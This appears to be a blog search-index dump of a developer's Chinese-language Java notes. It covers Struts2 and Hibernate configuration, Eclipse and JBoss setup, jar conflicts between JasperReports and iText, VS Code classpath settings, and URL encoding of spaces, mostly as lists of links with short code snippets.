配置文件struts.xml和web.xml詳解_網絡_gopain-CSDN博客 管理上還請斟酌，不過用第二個方法就很方便了 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:3","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"與 spring 設定 struts2默认拦截器之autowiring_Java_shendeguang的专栏-CSDN博客 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:4","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"action 到 jsp 傳值 struts2中action传值到jsp页面的3种方法 - 开源中国首席吊炸天的个人空间 - OSCHINA ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:6:5","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"struts2 錯誤處理 起風前的相遇: Struts2 處理404錯誤的方法 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:7:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"攔截器 Struts2【拦截器】就是这么简单 - 知乎 \u003cinterceptor-stack name=\"defaultStack\"\u003e 宣告攔截器… JSON 設定 \u003cpackage name=\"default\" namespace=\"/\" extends=\"json-default\"\u003e \u003cglobal-results\u003e \u003cresult name=\"dataResult\" type=\"json\"\u003e \u003c!-- \u003cparam name=\"root\"\u003ejsonresult_var\u003c/param\u003e 針對 action 的 變數當 json 的 root \u003cparam name=\"contentType\"\u003etext/json\u003c/param\u003e --\u003e \u003c/result\u003e .... 參考:Struts2和JSON實例 - Struts2教學 更多設定可參考 JSON plugin 下載檔案 \u003cresult name=\"download\" type=\"stream\"\u003e \u003cparam name=\"contentType\"\u003eapplication/octet-stream\u003c/param\u003e \u003cparam name=\"inputName\"\u003efileStream\u003c/param\u003e \u003cparam name=\"contentDisposition\"\u003eattachment;filename=\"${fileName}\"\u003c/param\u003e \u003cparam name=\"bufferSize\"\u003e1024\u003c/param\u003e \u003c/result\u003e 在上述配置代碼中，分別通過 stream 結果類型的屬性設置了所要下載文件的類型、名稱和輸入流。其中 ${filename} 表示在項目運行時，將 action 中的 filename 屬性動態地填充在 ${} 中間部分，這樣就可以動態地獲取所要下載的文件名稱。 通常上述關係，會做 setFileName(xxx) 參考:Struts2文件下载实例 移除 url .action 在 struts.xml 加入 tag 可以解決這個問題 \u003cstruts\u003e \u003cconstant name=\"struts.action.extension\" value=\"\"/\u003e \u003c/struts\u003e 不過我發現預設是 ,,action ，代表.action 跟空白也可以使用 上述詳細教學第三章有提到 java - Struts 2 - Removing action from url - Stack Overflow 如何刪除Struts2動作的後綴擴展名 - Struts2教學 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:7:1","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Hibernate Hibernate第一篇【介绍Hibernate，简述ORM，快速入门】 - 掘金 Hibernate第二篇【API讲解、执行流程图】 - 掘金 Hibernate第三篇【主配置文件、映射文件、复合主键映射】 - 掘金 Hibernate第五篇【inverse、cascade属性详解】 - 掘金 Hibernate第六篇【多对多映射、一对一映射】 - 掘金 Hibernate第七篇【对象状态、一级缓存】 - 掘金 Hibernate第八篇【懒加载】 - 掘金 Hibernate第九篇【组件映射、继承映射】 - 掘金 Hibernate第十篇【Hibernate查询详解、分页查询】 - 掘金 Hibernate第十一篇【配置C3P0数据库连接池、线程Session】 - 掘金 Hibernate第十二篇【二级缓存介绍、缓存策略、查询缓存、集合缓存】 - 掘金 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:8:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.] Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]_Java_鹏霄万里展雄飞-CSDN博客 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:8:1","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"OpenSessionInViewFilter [转]Spring配置之OpenSessionInViewFilter - yunlvrensheng - 博客园 ssh中org.springframework.orm.hibernate4.support.OpenSessionInViewFilter的作用及配置 - 243573295 - 博客园 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:8:2","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"其他為整理 thymeleaf的下拉框(select option)回显选中_Java_皮皮鹏的博客-CSDN博客 Struts2 和 springMVC 的區別 - IT閱讀 Struts2 Spring Hibernate的工作流程及原理(整理的) | 程式前沿 Struts2下載文件實例 - Struts2基礎教程 Java : How to generate serialVersionUID – Mkyong.com 关于tomcat WEB-INF/lib下类加载顺序 - 四少啊 - 博客园 struts2對json的支持 - IT閱讀 SpringApplication你不知道的那些事！ - 掘金 菜鳥工程師 肉豬: Spring @Configuration作用 IoC - Annotation (@Configuration) - 史帝芬心得筆記 菜鳥工程師 肉豬: Spring Boot properties file value injection 屬性配置檔注入 @SpringBootApplication @PropertySource( value = { \"classpath:my-messages.properties\", \"classpath:other-messages.properties\" }, ignoreResourceNotFound = true, encoding = \"UTF-8\" ) public class DemoApplication { public static void main(String[] args) { ApplicationContext appCtx = SpringApplication.run(DemoApplication.class, args); MyMessages myMessages = appCtx.getBean(MyMessages.class); OtherMessages otherMessages = appCtx.getBean(OtherMessages.class); myMessages.printPropertiesValue(); System.out.println(\"-----------------------\"); otherMessages.printPropertiesValue(); } } Spring Boot Bean和依赖注入 - Spring Boot教程™ Springboot2教程：@SpringBootApplication自动配置-Java知音 整合Spring时Service层为什么不做全局包扫描详解_慕课手记 用最简单的语言来告诉你:SpringMVC中@Controller,@Service,@repository,@Component的用法 - HelloJava菜鸟社区 构建工具的进化：ant, maven, gradle - 知乎 给女朋友讲解什么是代理模式 解决错误The type List is not generic; it cannot be parameterized with arguments _Java_瓜爪牛的博客-CSDN博客 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:9:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Annotation Java注解（Annotation）原理详解_Java_心中要有一片海的专栏-CSDN博客 Java:Annotation(注解)–原理到案例 - 簡書 关于Java的Retention元注解 - 摆渡者 - OSCHINA Java 注解之 元注解 - 知乎 備份圖 裡面講的還滿細的!! ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:10:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"JAXRS jersey - Difference between JAX-RS and Spring Rest - Stack Overflow Spring MVC与JAX-RS比较与分析 - InfoQ spring version 2. New Features and Enhancements in Spring 3.0 [JAVA_Spring]Spring 3.2.2的各類jar說明 @ 程式開發學習之路 :: 痞客邦 :: Blog of Bruce: Hibernate 4.x 整合 Spring 3.x Spring：3大核心版本簡介、maven與Spring4構建工程、代碼實戰 - 每日頭條 Spring4新特性——Web开发的增强 - 《亿级流量网站架构核心技术》~ - ITeye博客 Spring 5.x 新特性 - 掘金 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:11:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"SLF4J SLF4J使用和与Log4J对比 - 簡書 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:12:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"java class list reflection - Java - Get a list of all Classes loaded in the JVM - Stack Overflow JAVA_OPTS=\"$JAVA_OPTS -verbose:class\" ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:13:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"ejb 語言技術: EJB3 Gossip [轉] EJB 3和Spring技術體系比較 - yjmyzz @ IT工程師數位筆記本 :: 痞客邦 :: 簡單鋪設Enterprise Java Bean(EJB)的架構 @ 資訊迴圈 :: 隨意窩 Xuite日誌 java ee基本是在企業裡用的，你編程以前，要配置一大堆xml這樣子，很可能會是javaee java se基本都用在學校，教學，科學實驗這些，配置個maven就了不起了 java me就是沒人用的那些... java ee , java se, java me 怎麼區分? - 知乎 Spring 上課筆記 (2) | Leo Yeh’s Blog ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:14:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"sitemesh SiteMesh初體驗 @ Jemmy Walker :: 痞客邦 :: java - SiteMesh - still active? v2 vs v3? - Stack Overflow [页面模板框架对比] Apache Tiles VS Sitemesh_Java_孤天浪雨-CSDN博客 Struts2 使用SiteMesh做网页布局 - Jersey - 博客园 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:15:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"JNDI Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow 放棄思考: JNDI + Derby + TomEE Plus 教學 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:16:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"ReflectionToStringBuilder ReflectionToStringBuilder用法优缺点及一个问题和分享_Darrensty的博客-CSDN博客_reflectiontostringbuilder ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:17:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Pretty-Print JSON in Java GSON Gson gson = new GsonBuilder().setPrettyPrinting().create(); JsonParser jp = new JsonParser(); JsonElement je = jp.parse(uglyJSONString); String prettyJsonString = gson.toJson(je); 存 Java JSONObject json = new JSONObject(jsonString); // Convert text to object System.out.println(json.toString(4)); // Print it with specified indentation ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:18:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"抓取檔案位置 抓取編譯檔案 getClass().getClassLoader().getResource(\"main/resources/simple/xxx.xlsx\").getFile(); 讀取程式執行路徑 1 return new File(MyClass.class.getProtectionDomain().getCodeSource().getLocation() .toURI()).getPath(); java - How to get the path of a running JAR file? - Stack Overflow ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:19:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["Java"],"content":"Procedure oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow 使用非同步處理提升資料庫更新速度-黑暗執行緒 寫好SQL很有必要！ - 數據分析那些事 - Medium 阿肥的DB學習之路: 四月 2017 RxJava2+ Retrofit2 RxJava2+ Retrofit2 簡介 java web中po 和dto之间的使用 - 的回答 - SegmentFault 思否 项目结构介绍-博客 PO BO VO DTO POJO DAO 概念及其作用（附转换图） 数据模型 - 阿里规约（1） | Ironbin 基礎於：Java、Amazon AWS，進行：開發，測試，部署（Code / Infra），維運。 Spring MVC Framework的Servlet Container 應用服務開發。 Vert.X 或 Micronaut 的微服務Microservices開發。 The Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。 基礎於：Java、Amazon AWS，進行：開發，測試，部署（Code / Infra），維運。 Spring MVC Framework的Servlet Container 應用服務開發。 Vert.X 或 Micronaut 的微服務Microservices開發。 Apache Kafka的事件及訊息驅動應用開發。 The Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。 Cloudformation 腳本撰寫。 懂或有意願學習：Jenkins + CodePipeline 腳本撰寫經驗。 協助導入及實作AWS及On Premises 混合雲 ","date":"2020-03-28","objectID":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/:20:0","tags":["java","spring","struts2"],"title":"Java 雜記","uri":"/blog/posts/Java-%E9%9B%9C%E8%A8%98/"},{"categories":["HTML"],"content":"最近做 js 測試時後發現 我寫這麼久才注意到這個東西 這邊小記一下 簡單來說%20和(+)加號都是變成空白鍵 相反的%2B會變成+ http://httpbin.org/get?test=123%20123 動手測試比較快 當HTML表單中的數據被提交時，表單的域名與值被編碼並通過HTTP的GET或者POST方法甚至更古遠的email[2]把請求發送給伺服器。這裡的編碼方法採用了一個非常早期的通用的URI百分號編碼方法，並且有很多小的修改如新行規範化以及把空格符的編碼\"%20\"替換為\"+\" . 按這套方法編碼的數據的MIME類型是application/x-www-form-urlencoded, 當前仍用於（雖然非常過時了）HTML與XForms規範中. 此外，CGI規範包括了web伺服器如何解碼這類數據、利用這類數據的內容。 如果發送的是HTTP GET請求, application/x-www-form-urlencoded數據包含在所請求URI的查詢成分中. 如果發送的是HTTP POST請求或通過email, 數據被放置在消息體中，媒體類型的名字被包含在消息的Content-Type頭內部。 URL encoding the space character: + or %20? - Stack Overflow urlencode - Encoding URL query parameters in Java - Stack Overflow 你所不知道 ❌ URL - 小二の伤寒杂病论 - SegmentFault 思否 你所不知道 ❌ PHP POST - 小二の伤寒杂病论 - SegmentFault 思否 台灣 .NET 技術愛好者俱樂部 | 你覺得哪一種 Query String 格式才是標準 | Facebook ","date":"2020-03-18","objectID":"/blog/posts/%E6%9C%89%E9%97%9C-url-%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6-20%E5%92%8C/:0:0","tags":["html"],"title":"有關 url 空白字符(%20和+)","uri":"/blog/posts/%E6%9C%89%E9%97%9C-url-%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6-20%E5%92%8C/"},{"categories":["Java"],"content":"TODO: 尚未整理完成 最近工作需求，需要使用 Java 這邊做一些有關 Java 雜記 常常我們配置 Eclipse 都沒有想過 Java 運作原理 藉著 GUI 操作我們也不知道它底下是怎麼跑的 雖然大學有玩過用 java -cp xxxx 來編譯一些程式 go安裝筆記\u0026gopath環境變數設定 | 程式狂想筆記 對 classpath 只能說編譯時候可以用別的 lib(或別的class) 搭配使用 不過我發現用 Eclipse 我不知道他是怎麼執行 今天主要好好研究 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:0:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Java ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:1:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Java Jar 檔案衝突 【经验总结】Java利用iText实现PDF操作-技术-LittleblackOnline 最近公司 jasperreport 和 itextpdf 衝突 為了做 pdfwriter 做 setEncryption PdfWriter.ENCRYPTION_AES_128 允許列印,編輯，複製，簽名 加密級別：128-bit-AES PdfWriter.STANDARD_ENCRYPTION_128 允許列印,編輯，複製，簽名 加密級別：128-bit-RC4 【itext學習之路】——-（第三篇）對pdf文件進行加密和許可權設定 - IT閱讀 Java 動態載入jar和class檔案例項解析 | 程式前沿 Tomcat启动时classloader加载顺序 _Java_天乙贵人-CSDN博客 ClassLoader解决jar包冲突问题_JavaScript_Peter_K的专栏-CSDN博客 你必须知道的 17 个 Composer 最佳实践（已更新至 22 个） | PHP 技术论坛 但會遇到 java.lang.ClassNotFoundException: org.bouncycastle.asn1.DEREncodable 但用另一個 jar ，jasperreport 就會有衝突 簡單尋找衝突方式 看 Maven 對應版本(Compile Dependencies ) jasperreports » 6.1.0→ itext » 2.1.7→bcprov-jdk15on 138 itextpdf » 5.5.5→bcprov-jdk15on 1.49 依照 classpath 規則，正常 jar 檔相同 namespace 只會吃到第一個，之後讀到都會被忽略 正常解法應該要用對應版本，可以以框架為主，通常搭配的 jar 應該使用對應相同的版本會比較好 當然也有找到下面方法，但我覺得不是最好的做法 classloader解决jar冲突隔离_Java_到西伯利亚浪-CSDN博客 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:1:1","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"使用 Maven 之前也有使用 Maven 但也不是很了解 Mave教學 | Maven 初學者中文教程 但我這邊發現所有的套件都會在~/.m2 也就是說，所有的 Project 都是吃一樣的 jar 檔案 這邊真的還滿奇特 不知道他 javac 是怎麼加檔案進去 javac、classpath的编译和生成Maven工程 - 简书 備份圖 看上面這篇 classpath 可以放 Project 資料夾路徑沒編譯的 java? 有待確認…，不過應該沒錯 Java包管理的那些事4——Maven - 知乎 開發中：給大家一份Maven知識整理，希望有所幫助 - 每日頭條 因為目前公司碰的專案沒有用到 Maven和 Gradle 有機會接觸再補充 專案自動構建工具對比(Maven、Gradle、Ant) - IT閱讀 Maven 的基本概念與在 eclipse 專案實作 @ MISTECH 技術手抄本 :: 隨意窩 Xuite日誌 SpringBoot加载外部依赖 - 简书 Maven和Gradle对比 - 黄博文的地盘 Eclipse wtp Deployment Assembly « Allen’s Blog ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:2:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Eclipse 相關環境設定的影響 昭佑.天翔: Eclipse Project Facet 功能 Eclipse Build Path 的理解 - IT閱讀 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:3:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"部屬 java Jenkins入门(一)_运维_weixin_43112000的博客-CSDN博客 Jenkins+Java+Maven+不中断服务+自动化部署+失败自动回滚_Java_weixin_43112000的博客-CSDN博客 基于Jenkins的JAVA持续部署环境搭建 | 大专栏 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:4:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Jboss 記得要設定 JBOSS_HOME JBOSS_HOME = C:\\jboss-4.0.3SP1 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"jsp 熱加載 jboss-eap-7.1\\standalone\\configuration\\standalone.xml 裡面 改成 就能不用重啟jsp了 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:1","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"jboss 使用 eclipse 沒有 log 移除 Server 我發現 log 消失了 後來突然想到有 JBoss EAP Server 點兩下，選擇 Open Launch configuration ，然後在 VM arguments 裡最後加入 -Dorg.jboss.as.logging.per-deployment=false 參考:JBoss EAP 6.x 對於 Log4j \u0026 System.out 在 Eclipse 上 Console 顯示設定 @ MISTECH 技術手抄本 :: 痞客邦 :: ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:2","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"java 熱加載 使用 debug 模式就能做到熱加載 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:3","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Eclipse 的 .classpath .project .settings 從數據上我們容易看出，上面描述了工程的依賴文件： 源文件的具體位置（kind=“src”） 運行的系統環境（kind=“con”） 工程的library的具體位置信息(kind=“lib”) 在每個lib的xml子節點中，有關於它的其它配置信息（例如我配置的那個\"javadoc_location\"） 項目的輸出目錄(kind=“output”) 總體上說這個文件就是配置整個工程的運行環境。 eclipse项目中的.settings .project .classpath 个人见解_开发工具_只在朝暮间的博客-CSDN博客 除了Maven，还有一种解决jar包管理及定制的好方法 - Java开发分享 - SegmentFault 思否 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:4","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Tomcat 一些事情 理解Tomcat的Classpath-常见问题以及如何解决_Java_AndyElvis的专栏-CSDN博客 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:5:5","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"struct2 這邊簡單小記，有空再補 action spa!xxx spa 找 xml 對照的 java xxx 是 method 沒寫 xxx 預設是 execute 頁面傳到 jsp 會做 setXXXX,getXXX ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:6:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"struct2 和 spring Struts2 Spring集成_w3cschool ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:7:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Eclipse 修改檔案不用重啟 Server eclipse配置修改代码不用重启_开发工具_小白菜-CSDN博客 Eclipse 修改方法裡面的內容不用重啟專案 - IT閱讀 jboss + eclipse 如何設置才能不重啟服務就能自動編譯jsp - 开发者知识库 Java碼農清單: jboss 修改jsp ,不須重啟servers伺服器 https://tpu.thinkpower.com.tw/tpu/articleDetails/557 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:8:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"Eclipse Project clean 以前開發經驗都知道 Project 執行有問題 只需要按 Project → clean 有找到他是清除 class 文件 所以有些時候編譯不通過原因是沒有project-\u003eclean造成的！！！ eclipse \u003e project \u003e clean 是把 eclipse 編譯生成的 class 之類的文件刪除，以便以後再次編譯。 redeploy 是指把 web 重新部署到 tomcat， 這可能會把 jsp/html/css/js 之類的文件及 WEB-INF 目錄複製到 tomcat 或者是把整個項目導致成一個 war 複製到 tomcat。 eclipse中project-\u003eclean的作用是什么 - THISISPAN - 博客园 在eclipse中写JavaWeb项目时，有时候会出现代码修改了，但是执行的效果还是修改之前的，这时候clean一下就会解决问题 1.clean操作 Project—-\u003eclean—\u003e选择需要clean的项目 2.clean原理 eclipse为了提高效率，并不是每次启动项目都会检查插件，通过clean就是强制eclipse去检查已安装插件。 我们都知道.java文件是通过编译成.class文件运行的，而clean后会删除已经编译生成的.class文件并重新部署项目。 总起来将就是强制检查已安装插件，清除以前编译的信息，重新部署项目。 3.clean后无法正常运行 右键项目—-\u003eproperties如图，去掉Abort build when build path errors occur eclipse中的clean操作 - debugger.wiki - debugger.wiki 發現還有 Deployment Assembly java Build path是編譯路徑設置,主要用來設置源代碼的編譯路徑默認是default output folder Web Deployment Assembly是eclipse中的發布路徑設置，DeployPath表示每個資源發佈之後的文件路徑 理解 eclipse中使用tomcat使用啟動web項目的流程是 java build path編譯項目源代碼生成的class文件放到buildpath的設置路徑中，根據web deployment assembly將項目中的各個資源發佈到設置的指定文件中 eclipse中Deployment Assembly选项设置说明_开发工具_我的世界，真实可见 -CSDN博客 這樣我就突然想到之前專案設錯 Deployment Assembly 就不能執行 不是 Web 專案是沒有 Deployment Assembly ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:9:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"eclipse 設定編譯出位置 .class path 應該是相同路徑 主要看.classpath \u003cclasspathentry kind=\"src\" path=\"src\"/\u003e 其他相關 Path to .class file in eclipse - Stack Overflow 在eclipse中使用Gradle之修改default output folder « Jason’s Blog Eclipse 看 Properties 會亂碼 安裝 PropertiesEditor 就能正常 可參考下面連結 Eclipse Properties 顯示中文字 | Xuan’s Blog eclipse中 XXXX.properties文件 不显示中文，显示的unicode编码。_开发工具_mukvintt的博客-CSDN博客 Eclipse 實用快速鍵 重構 Alt+Shift+R: 重命名 (是我自己最愛用的一個了,尤其是變量和類的Rename,比手工方法能節省很多勞動力) Alt+Shift+M: 抽取方法 (這是重構裡面最常用的方法之一了,尤其是對一大堆泥團代碼有用) Alt+Shift+C: 修改函數結構(比較實用,有N個函數調用了這個方法,修改一次搞定) Alt+Shift+L: 抽取本地變量( 可以直接把一些魔法數字和字符串抽取成一個變量,尤其是多處調用的時候) Alt+Shift+F: 把Class中的local變量變為field變量 (比較實用的功能) Alt+Shift+I: 合併變量(可能這樣說有點不妥Inline) Alt+Shift+V: 移動函數和變量(不怎麼常用) Alt+Shift+Z: 重構的後悔藥(Undo) 參考: Eclipse使用技巧 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:9:1","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"vscode 使用 web 方案 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:10:0","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"先說明我目前用到的專案 .classpath 底下有設定這些 \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cclasspath\u003e \u003cclasspathentry kind=\"src\" path=\"src\"/\u003e \u003cclasspathentry kind=\"con\" path=\"org.eclipse.jst.j2ee.internal.web.container\"/\u003e \u003cclasspathentry kind=\"con\" path=\"org.eclipse.jst.j2ee.internal.module.container\"/\u003e \u003cclasspathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-common\"/\u003e \u003cclasspathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxx-sms\"/\u003e \u003cclasspathentry kind=\"con\" path=\"org.eclipse.jst.server.core.container/org.jboss.ide.eclipse.as.core.server.runtime.runtimeTarget/JBoss EAP 7.1 Runtime\"/\u003e \u003cclasspathentry combineaccessrules=\"false\" kind=\"src\" path=\"/xxxx-pdf\"/\u003e \u003cclasspathentry kind=\"con\" path=\"org.eclipse.jdt.launching.JRE_CONTAINER/org.eclipse.jdt.internal.debug.ui.launcher.StandardVMType/JavaSE-1.8\"\u003e \u003cattributes\u003e \u003cattribute name=\"owner.project.facets\" value=\"java\"/\u003e \u003c/attributes\u003e \u003c/classpathentry\u003e \u003cclasspathentry kind=\"output\" path=\"build/classes\"/\u003e \u003c/classpath\u003e 看到 add classpath 有設定一些專案旁的 Project vscode 吃的到 .classpath 檔案 但 vscode 單讀開 Project 不會吃到的樣子 有找到下面的方法 java.project.referencedLibraries 但還是沒用 ","date":"2020-03-10","objectID":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/:10:1","tags":["java","tomcat","jboss"],"title":"Java / Jboss 小記","uri":"/blog/posts/Java-Tomcat-%E5%B0%8F%E8%A8%98/"},{"categories":["Java"],"content":"vscode 載入 jar 檔方法 \"java.project.referencedLibraries\": { \"include\": [ \"library/**/*.jar\", \"/home/username/lib/foo.jar\" ], \"exclude\": [ \"library/sources/**\" ], \"sources\": { \"library/bar.jar\": \"library/sources/bar-src.jar\" } } Maven Support, Java Package, and 